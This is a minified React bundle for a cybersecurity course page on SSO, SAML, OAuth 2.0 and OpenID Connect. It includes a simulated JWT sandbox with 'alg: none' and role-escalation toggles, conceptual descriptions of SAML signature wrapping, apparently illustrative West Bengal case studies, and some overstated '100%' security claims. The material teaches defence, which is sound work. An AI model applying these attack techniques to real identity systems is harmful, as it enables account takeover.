    jwt = sim.create_oidc_id_token("usr_10482", "susmita@bank.barrackpore.gov.in", nonce)
    print(f"Generated JWT ID Token:\\n{jwt[:40]}...{jwt[-30:]}")

    verification = sim.verify_oidc_id_token(jwt, expected_nonce=nonce)
    print(f"Token Verification: {verification['status']} for {verification.get('user')} (Role: {verification.get('role')})")

    # Test 3: SAML XML Signature Wrapping (XSW)
    print("\\n" + "=" * 80)
    print("[TEST 3]: SAML 2.0 XML SIGNATURE WRAPPING (XSW) FORENSICS")
    xsw_result = sim.simulate_saml_xsw_attack(has_xsw_injection=True)
    print(f"SAML Analysis : {xsw_result['verdict']}")
    print(f"Explanation   : {xsw_result['explanation']}")
    print("=" * 80)

if __name__ == "__main__":
    main()
`,U=()=>{n.useId(),n.useId();const[s,b]=n.useState(1),u=[{step:1,title:"1. Client Generates PKCE Parameters",actor:"Client SPA / Mobile App",action:"Generates high-entropy code_verifier ('d8f9a2b4...') and computes SHA-256 code_challenge ('7xK9mP...').",paramDesc:"code_challenge = BASE64URL(SHA-256(code_verifier)) with method S256."},{step:2,title:"2. Authorization Request with Code Challenge",actor:"Browser ➔ IdP /authorize",action:"Redirects user to Identity Provider with client_id, response_type=code, scope=openid, and code_challenge.",paramDesc:"The raw code_verifier stays secret in client memory!"},{step:3,title:"3. IdP Returns Ephemeral Authorization Code",actor:"IdP ➔ Browser Redirect",action:"User authenticates; IdP issues short-lived authorization_code ('auth_code_99182') bound to the stored challenge.",paramDesc:"Even if an attacker intercepts this code, they cannot redeem it without the secret verifier."},{step:4,title:"4. Token Redemption & Cryptographic Proof",actor:"Client ➔ IdP /token",action:"Client sends authorization_code + code_verifier. IdP hashes the verifier and verifies match before issuing ID Token & Access Token.",paramDesc:"100% immune to authorization code injection and interception!"}],o=u[s-1]||u[0],[l,f]=n.useState(!1),[i,m]=n.useState("RS256"),c=n.useMemo(()=>{let t=l?"GLOBAL_SUPER_ADMIN":"TREASURY_OFFICER",d="",p="",h="";return i==="none"?(d="CRITICAL VULNERABILITY: UNPROTECTED 'alg: none' TOKEN 🚨",p="bg-rose-950 text-rose-300 border-rose-700",h="Attacker stripped the signature and set alg to 'none'. Strict servers must reject unsigned tokens unconditionally."):l?(d="SIGNATURE VERIFICATION FAILED 🚨 (Tampering Detected)",p="bg-rose-950 text-rose-300 border-rose-700",h="Payload claims were modified from 'TREASURY_OFFICER' to 'GLOBAL_SUPER_ADMIN'. The cryptographic signature mismatch causes immediate rejection."):(d="JWT INTEGRITY & CLAIMS VERIFIED ✔",p="bg-emerald-950 text-emerald-300 border-emerald-700",h="Cryptographic signature matches header and payload bytes perfectly. Claims are authentic."),{role:t,status:d,badgeColor:p,reason:h}},[l,i]),[g,S]=n.useState("barrackpore_saml_xsw"),x={barrackpore_saml_xsw:{id:"barrackpore_saml_xsw",title:"Barrackpore Municipal Treasury: SAML XML Signature Wrapping (XSW)",location:"Municipal vendor portal managing vendor invoices of ₹1,20,00,000",engineers:"Susmita (SecOps Lead) & Debangshu (Senior Forensic Analyst)",threatScenario:"Penetration testing identified an XML Signature Wrapping (XSW) flaw where an attacker could duplicate the signed Assertion and inject a rogue admin Assertion to approve unauthorized invoices.",solution:"Replaced vulnerable XML DOM parser with strict XML Schema validator enforcing reference ID anchoring, and migrated modern vendor apps to OIDC PKCE.",outcome:"100% mitigation of XML signature manipulation; zero unauthorized invoice approvals."},kolkata_fintech_pkce:{id:"kolkata_fintech_pkce",title:"Salt Lake Sector V FinTech: OAuth 2.0 PKCE Hardening",location:"Mobile payment microservices processing 250,000 daily consumer transactions",engineers:"Mahima (Lead Cryptographer) & Mamata (Infrastructure Lead)",threatScenario:"Malicious mobile apps on Android devices registered custom URI schemes to intercept OAuth authorization codes.",solution:"Mandated RFC 7636 PKCE S256 method across all mobile clients and deprecated the legacy Implicit Grant (`response_type=token`).",outcome:"Interception of authorization codes became completely useless to adversaries; achieved PCI-DSS 4.0 requirement 8 compliance."},ichapur_defense_caep:{id:"ichapur_defense_caep",title:"Ichapur Ordnance Manufacturing: CAEP Real-Time Session Revocation",location:"Critical defense engineering terminals and manufacturing controllers",engineers:"Abhronila (CISO) & Incident Response Team",threatScenario:"When an engineer's device was flagged as infected with malware, active OAuth access tokens remained valid until natural expiration (60 minutes).",solution:"Deployed Continuous Access Evaluation Protocol (CAEP / Shared Signals), broadcasting instant session revocation events to all microservices within 200ms of threat detection.",outcome:"Eliminated the token expiration vulnerability window; immediate lockdown of compromised sessions across all defense microservices."}},a=x[g];return e.jsx("div",{className:"min-h-screen bg-slate-950 text-slate-100 p-4 md:p-8 space-y-8 font-sans",children:e.jsxs("div",{className:"max-w-6xl mx-auto space-y-8",children:[e.jsxs("header",{className:"bg-slate-900/80 border border-slate-800 rounded-2xl p-6 md:p-8 backdrop-blur-xl shadow-2xl space-y-4",children:[e.jsxs("div",{className:"flex flex-wrap items-center justify-between gap-4 border-b border-slate-800 pb-4",children:[e.jsxs("div",{className:"space-y-1",children:[e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("span",{className:"px-3 py-1 bg-amber-950 text-amber-400 border border-amber-800 rounded-full text-xs font-semibold uppercase tracking-wider",children:"Module 005_005 • Topic 10"}),e.jsx("span",{className:"px-3 py-1 bg-slate-800 text-slate-300 rounded-full text-xs font-semibold",children:"BCA BCAC703 • Cyber Security"})]}),e.jsx("h1",{className:"text-2xl md:text-3xl font-extrabold text-white tracking-tight",children:"Single Sign-On (SSO) & Identity Protocols: SAML, OAuth 2.0 & OpenID Connect"})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("span",{className:"text-xs text-slate-400",children:"Classroom Lab:"}),e.jsx("span",{className:"text-xs font-bold text-amber-400 bg-slate-950 px-3 py-1.5 rounded-lg border border-slate-800",children:"Barrackpore • West Bengal"})]})]}),e.jsxs("p",{className:"text-sm md:text-base text-slate-300 leading-relaxed",children:["Federated identity protocols form the backbone of modern enterprise Single Sign-On and cloud security. Dissect the architectural distinctions between ",e.jsx("strong",{children:"SAML 2.0"}),", ",e.jsx("strong",{children:"OAuth 2.0 (Authorization)"}),", and",e.jsx("strong",{children:"OpenID Connect 1.0 (Identity/Authentication)"}),". Master the ",e.jsx("strong",{children:"Authorization Code Flow with PKCE (RFC 7636)"}),", inspect ",e.jsx("strong",{children:"JSON Web Token (JWT) claims"}),", and analyze vulnerabilities including ",e.jsx("strong",{children:"XML Signature Wrapping (XSW)"}),"and ",e.jsx("strong",{children:"JWT algorithm confusion"}),"."]})]}),e.jsxs("section",{className:"bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-6 shadow-xl",children:[e.jsxs("div",{className:"flex items-center justify-between flex-wrap gap-4 border-b border-slate-800 pb-4",children:[e.jsxs("div",{children:[e.jsxs("h2",{className:"text-lg md:text-xl font-bold text-white flex items-center gap-2",children:[e.jsx("span",{children:"🔄"})," Studio 1: OAuth 2.0 / OIDC Authorization Code Flow with PKCE (RFC 7636)"]}),e.jsx("p",{className:"text-xs text-slate-400",children:"Step through how Proof Key for Code Exchange (PKCE) prevents authorization code interception on mobile and single-page apps."})]}),e.jsx("div",{className:"flex gap-2",children:[1,2,3,4].map(t=>e.jsxs("button",{onClick:()=>b(t),className:r("px-3 py-1.5 rounded-lg text-xs font-bold transition-all duration-200",s===t?"bg-amber-600 text-white shadow-lg shadow-amber-950":"bg-slate-950 text-slate-400 hover:text-white border border-slate-800"),children:["Step ",t]},t))})]}),e.jsxs("div",{className:"bg-slate-950 p-6 rounded-xl border border-slate-800 space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-slate-800 pb-3",children:[e.jsx("span",{className:"text-sm font-bold text-white",children:o.title}),e.jsxs("span",{className:"text-xs font-mono text-amber-400 bg-amber-950 px-3 py-1 rounded-full border border-amber-800",children:["Actor: ",o.actor]})]}),e.jsxs("div",{className:"p-4 bg-slate-900 rounded-lg border border-slate-800 space-y-2 text-xs",children:[e.jsx("div",{className:"text-slate-200 font-semibold leading-relaxed",children:o.action}),e.jsx("div",{className:"text-[11px] text-cyan-300 font-mono",children:o.paramDesc})]}),e.jsx("div",{className:"pt-2",children:e.jsxs("svg",{className:"w-full h-32 bg-slate-900/60 rounded-xl p-2",viewBox:"0 0 700 100","aria-label":"PKCE Flow Diagram",children:[e.jsx("rect",{x:"30",y:"20",width:"160",height:"60",rx:"8",fill:"#1e1b4b",stroke:"#6366f1",strokeWidth:"1.5"}),e.jsx("text",{x:"110",y:"45",fill:"#c7d2fe",fontSize:"10",fontWeight:"bold",textAnchor:"middle",children:"Client App (SPA / Mobile)"}),e.jsx("text",{x:"110",y:"62",fill:"#94a3b8",fontSize:"8",textAnchor:"middle",children:"Holds secret code_verifier"}),e.jsx("path",{d:"M 195 50 L 295 50",stroke:s>=2?"#f59e0b":"#475569",strokeWidth:"2"}),e.jsx("polygon",{points:"295,47 305,50 295,53",fill:s>=2?"#f59e0b":"#475569"}),e.jsx("rect",{x:"310",y:"20",width:"170",height:"60",rx:"8",fill:"#064e3b",stroke:"#10b981",strokeWidth:"1.5"}),e.jsx("text",{x:"395",y:"45",fill:"#a7f3d0",fontSize:"10",fontWeight:"bold",textAnchor:"middle",children:"IdP Auth Server"}),e.jsx("text",{x:"395",y:"62",fill:"#94a3b8",fontSize:"8",textAnchor:"middle",children:"Stores code_challenge"}),e.jsx("path",{d:"M 485 50 L 585 50",stroke:s>=4?"#10b981":"#475569",strokeWidth:"2"}),e.jsx("polygon",{points:"585,47 595,50 585,53",fill:s>=4?"#10b981":"#475569"}),e.jsx("rect",{x:"600",y:"20",width:"80",height:"60",rx:"8",fill:"#450a0a",stroke:"#dc2626",strokeWidth:"1.5"}),e.jsx("text",{x:"640",y:"45",fill:"#fca5a5",fontSize:"10",fontWeight:"bold",textAnchor:"middle",children:"API Server"}),e.jsx("text",{x:"640",y:"62",fill:"#94a3b8",fontSize:"8",textAnchor:"middle",children:"Accepts JWT"})]})})]})]}),e.jsxs("section",{className:"bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-6 shadow-xl",children:[e.jsxs("div",{className:"flex items-center justify-between flex-wrap gap-4 border-b border-slate-800 pb-4",children:[e.jsxs("div",{children:[e.jsxs("h2",{className:"text-lg md:text-xl font-bold text-white flex items-center gap-2",children:[e.jsx("span",{children:"🛡️"})," Studio 2: JSON Web Token (JWT) Structure & Tampering Sandbox"]}),e.jsx("p",{className:"text-xs text-slate-400",children:"Inspect JWT Header, Payload, and Signature. Toggle payload claims tampering and algorithm switching to observe verification results."})]}),e.jsx("div",{className:r("px-3 py-1 rounded-full text-xs font-bold border",c.badgeColor),children:c.status})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"bg-slate-950 p-5 rounded-xl border border-slate-800 space-y-4 text-xs",children:[e.jsx("span",{className:"font-bold text-slate-400 uppercase tracking-wider block",children:"Adversary Simulation Toggles"}),e.jsxs("label",{className:"flex items-center justify-between p-3 bg-slate-900 rounded-lg border border-slate-800 cursor-pointer",children:[e.jsxs("div",{children:[e.jsx("div",{className:"font-semibold text-white",children:"Tamper Role Claim in Payload"}),e.jsx("div",{className:"text-[10px] text-slate-400",children:"Escalate role from 'TREASURY_OFFICER' to 'GLOBAL_SUPER_ADMIN'"})]}),e.jsx("input",{type:"checkbox",checked:l,onChange:t=>f(t.target.checked),className:"accent-rose-500 w-4 h-4"})]}),e.jsxs("div",{className:"p-3 bg-slate-900 rounded-lg border border-slate-800 space-y-2",children:[e.jsx("span",{className:"font-semibold text-white block",children:"Signing Algorithm (alg Header):"}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx("button",{onClick:()=>m("RS256"),className:r("px-3 py-1 rounded text-xs font-bold transition-all",i==="RS256"?"bg-emerald-600 text-white":"bg-slate-800 text-slate-400 hover:text-white"),children:"RS256 (RSA Signature ✔)"}),e.jsx("button",{onClick:()=>m("none"),className:r("px-3 py-1 rounded text-xs font-bold transition-all",i==="none"?"bg-rose-600 text-white":"bg-slate-800 text-slate-400 hover:text-white"),children:"alg: none (Exploit Attack 🚨)"})]})]})]}),e.jsxs("div",{className:"bg-slate-950 p-5 rounded-xl border border-slate-800 space-y-3 flex flex-col justify-between text-xs",children:[e.jsxs("div",{className:"space-y-2 font-mono",children:[e.jsxs("div",{className:"p-2 bg-slate-900 rounded border border-indigo-800/40 text-indigo-300",children:[e.jsx("span",{className:"text-slate-500 font-bold block text-[10px]",children:"1. Header (Red/Purple):"}),`{"alg": "${i}", "typ": "JWT"}`]}),e.jsxs("div",{className:"p-2 bg-slate-900 rounded border border-cyan-800/40 text-cyan-300",children:[e.jsx("span",{className:"text-slate-500 font-bold block text-[10px]",children:"2. Payload (Cyan):"}),`{"sub": "usr_10482", "role": "${c.role}", "iss": "barrackpore.gov.in"}`]}),e.jsxs("div",{className:"p-2 bg-slate-900 rounded border border-emerald-800/40 text-emerald-300",children:[e.jsx("span",{className:"text-slate-500 font-bold block text-[10px]",children:"3. Signature (Green):"}),i==="none"?"[STRIPPED / EMPTY]":"RSA_SHA256_DIGEST_SIGNATURE"]})]}),e.jsxs("div",{className:"text-xs text-slate-300 leading-relaxed bg-slate-900 p-3 rounded-lg border border-slate-800",children:[e.jsx("strong",{className:"text-white",children:"Validation Verdict: "}),c.reason]})]})]})]}),e.jsxs("section",{className:"bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-6 shadow-xl",children:[e.jsxs("div",{className:"flex items-center justify-between flex-wrap gap-4 border-b border-slate-800 pb-4",children:[e.jsxs("div",{children:[e.jsxs("h2",{className:"text-lg md:text-xl font-bold text-white flex items-center gap-2",children:[e.jsx("span",{children:"🏛️"})," Studio 3: Regional SOC Incident Response Drills (West Bengal)"]}),e.jsx("p",{className:"text-xs text-slate-400",children:"Case studies of SAML XSW attacks, OAuth PKCE implementations, and real-time CAEP session revocations."})]}),e.jsx("div",{className:"flex flex-wrap gap-2",children:Object.keys(x).map(t=>e.jsx("button",{onClick:()=>S(t),className:r("px-3 py-1.5 rounded-lg text-xs font-bold transition-all duration-200",g===t?"bg-amber-600 text-white shadow-lg shadow-amber-950":"bg-slate-950 text-slate-400 hover:text-white border border-slate-800"),children:t==="barrackpore_saml_xsw"?"Barrackpore SAML XSW":t==="kolkata_fintech_pkce"?"Kolkata OAuth PKCE":"Ichapur CAEP Revocation"},t))})]}),e.jsxs("div",{className:"bg-slate-950 p-6 rounded-xl border border-slate-800 space-y-4",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-slate-800 pb-3",children:[e.jsx("span",{className:"text-base font-bold text-white",children:a.title}),e.jsx("span",{className:"text-xs text-amber-400 font-mono bg-amber-950 px-3 py-1 rounded-full border border-amber-800",children:a.location})]}),e.jsxs("div",{className:"text-xs text-slate-400",children:[e.jsx("strong",{className:"text-slate-300",children:"Lead SecOps Engineers: "})," ",a.engineers]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4 text-xs",children:[e.jsxs("div",{className:"bg-slate-900 p-4 rounded-lg border border-slate-800 space-y-2",children:[e.jsx("span",{className:"font-bold text-rose-400 uppercase text-[10px] tracking-wider block",children:"Threat Vector"}),e.jsx("p",{className:"text-slate-300 leading-relaxed",children:a.threatScenario})]}),e.jsxs("div",{className:"bg-slate-900 p-4 rounded-lg border border-slate-800 space-y-2",children:[e.jsx("span",{className:"font-bold text-amber-400 uppercase text-[10px] tracking-wider block",children:"Protocol Architecture"}),e.jsx("p",{className:"text-slate-300 leading-relaxed",children:a.solution})]}),e.jsxs("div",{className:"bg-slate-900 p-4 rounded-lg border border-slate-800 space-y-2",children:[e.jsx("span",{className:"font-bold text-emerald-400 uppercase text-[10px] tracking-wider block",children:"Operational Outcome"}),e.jsx("p",{className:"text-slate-300 leading-relaxed",children:a.outcome})]})]})]})]}),e.jsxs("section",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"bg-rose-950/20 border border-rose-900/40 rounded-2xl p-6 space-y-4",children:[e.jsxs("h3",{className:"text-base font-bold text-rose-400 flex items-center gap-2",children:[e.jsx("span",{children:"⚠️"})," Common Pitfalls & Flaws"]}),e.jsxs("ul",{className:"space-y-3 text-xs text-slate-300",children:[e.jsxs("li",{className:"flex items-start gap-2",children:[e.jsx("span",{className:"text-rose-400 font-bold",children:"•"}),e.jsxs("span",{children:[e.jsx("strong",{children:"Using Raw OAuth 2.0 for Authentication:"})," Access tokens grant API permissions; they do not assert authenticated user identity without OIDC."]})]}),e.jsxs("li",{className:"flex items-start gap-2",children:[e.jsx("span",{className:"text-rose-400 font-bold",children:"•"}),e.jsxs("span",{children:[e.jsx("strong",{children:"Calling `jwt.decode()` without `jwt.verify()`:"})," Deserializing claims without validating signatures allows attackers to spoof arbitrary admin tokens."]})]}),e.jsxs("li",{className:"flex items-start gap-2",children:[e.jsx("span",{className:"text-rose-400 font-bold",children:"•"}),e.jsxs("span",{children:[e.jsx("strong",{children:"Storing Tokens in `localStorage`:"})," Accessible to malicious JavaScript via Cross-Site Scripting (XSS); use HttpOnly cookies."]})]})]})]}),e.jsxs("div",{className:"bg-emerald-950/20 border border-emerald-900/40 rounded-2xl p-6 space-y-4",children:[e.jsxs("h3",{className:"text-base font-bold text-emerald-400 flex items-center gap-2",children:[e.jsx("span",{children:"🛡️"})," Identity Protocol Best Practices"]}),e.jsxs("ul",{className:"space-y-3 text-xs text-slate-300",children:[e.jsxs("li",{className:"flex items-start gap-2",children:[e.jsx("span",{className:"text-emerald-400 font-bold",children:"•"}),e.jsxs("span",{children:[e.jsx("strong",{children:"Mandate PKCE (S256) for All Clients:"})," Eliminate Authorization Code interception across mobile, SPA, and confidential apps."]})]}),e.jsxs("li",{className:"flex items-start gap-2",children:[e.jsx("span",{className:"text-emerald-400 font-bold",children:"•"}),e.jsxs("span",{children:[e.jsx("strong",{children:"Hardcode Permitted JWT Algorithms:"})," Explicitly whitelist `['RS256', 'ES256']` and reject `alg: none` and `HS256` key confusion."]})]}),e.jsxs("li",{className:"flex items-start gap-2",children:[e.jsx("span",{className:"text-emerald-400 font-bold",children:"•"}),e.jsxs("span",{children:[e.jsx("strong",{children:"Deploy Continuous Access Evaluation (CAEP):"})," Broadcast real-time security events to revoke sessions immediately upon threat detection."]})]})]})]})]}),e.jsxs("section",{className:"bg-slate-900/90 border border-slate-800 rounded-2xl p-6 space-y-4 shadow-xl",children:[e.jsxs("div",{className:"flex items-center gap-2 text-amber-400 font-bold text-base border-b border-slate-800 pb-3",children:[e.jsx("span",{children:"💡"})," Instructor Hints & Retention Checklist"]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4 text-xs text-slate-300",children:[e.jsxs("div",{className:"bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-2",children:[e.jsx("span",{className:"font-bold text-amber-300",children:"Think About:"}),e.jsx("p",{className:"leading-relaxed",children:"Why was the OAuth 2.0 Implicit Grant deprecated in OAuth 2.1? Because returning access tokens in URL fragments exposed them in browser history and proxy server logs! Always use Authorization Code Flow with PKCE!"})]}),e.jsxs("div",{className:"bg-slate-950 p-4 rounded-xl border border-slate-800 space-y-2",children:[e.jsx("span",{className:"font-bold text-emerald-300",children:"Student Checklist:"}),e.jsxs("ul",{className:"space-y-1.5 list-disc list-inside text-slate-400",children:[e.jsx("li",{children:"SAML = XML-based Enterprise Web SSO."}),e.jsx("li",{children:"OAuth 2.0 = Delegated API Authorization (Scopes & Access Tokens)."}),e.jsx("li",{children:"OpenID Connect (OIDC) = Identity layer on top of OAuth issuing ID Tokens."}),e.jsx("li",{children:"PKCE (RFC 7636) binds code_verifier to code_challenge via SHA-256."}),e.jsx("li",{children:"JWTs consist of Base64URL(Header) . Base64URL(Payload) . Base64URL(Signature)."})]})]})]})]}),e.jsxs("section",{className:"space-y-4",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"p-2 rounded-lg bg-amber-950 border border-amber-800 text-amber-400 text-lg",children:"🐍"}),e.jsxs("div",{children:[e.jsx("h2",{className:"text-xl font-bold text-white",children:"Hands-on SSO & Identity Protocols Lab Script"}),e.jsx("p",{className:"text-xs text-slate-400",children:"Standalone Python script simulating SAML XSW validation, PKCE parameter generation, and OIDC JWT signature verification"})]})]}),e.jsx(k,{fileModule:T,title:"sso_identity_protocols.py",highlightLines:[25,45,65,85,105]})]}),e.jsx("section",{className:"space-y-4",children:e.jsx(A,{title:"Single Sign-On (SSO) & Identity Protocols FAQs",questions:I})}),e.jsx(y,{note:"For your BCA BCAC703 examination: Clearly distinguish between SAML 2.0 (XML enterprise federation), OAuth 2.0 (API delegated authorization), and OpenID Connect 1.0 (JWT identity authentication layer). Draw the complete Authorization Code Flow with PKCE (RFC 7636) showing code_verifier and code_challenge hashing. Detail the 3-part structure of JSON Web Tokens (JWT) and explain how XML Signature Wrapping (XSW) and JWT algorithm confusion attacks are executed and defended."}),e.jsx("section",{className:"space-y-4",children:e.jsx(v,{content:w,title:"Topic 10: SSO & Identity Protocols Study Guide",stampEnabled:!0,showDownload:!0,downloadButtonText:"Download Topic 10 Note",downloadFileName:"topic10_sso_protocols_note.txt"})})]})})};export{U as default};
